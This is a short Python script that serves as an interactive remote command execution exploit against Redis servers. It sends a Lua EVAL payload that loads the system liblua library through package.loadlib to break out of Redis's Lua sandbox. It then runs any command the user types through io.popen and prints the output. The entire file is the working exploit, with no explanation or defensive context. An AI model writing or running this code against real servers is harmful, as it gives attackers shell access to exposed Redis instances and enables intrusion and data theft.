import redis
import sys

def shell(ip,port,cmd):
	lua= 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("'+cmd+'", "r"); local res = f:read("*a"); f:close(); return res'
	r  =  redis.Redis(host = ip,port = port)
	script = r.eval(lua,0)
	print(script)

if __name__ == '__main__':
	ip = input("Please input redis ip:\n>>")
	port = input("Please input redis port:\n>>")
	while True:
		cmd = input("input exec cmd:(q->exit)\n>>")
		if cmd == "q" or cmd == "exit":
			sys.exit()
		shell(ip,port,cmd)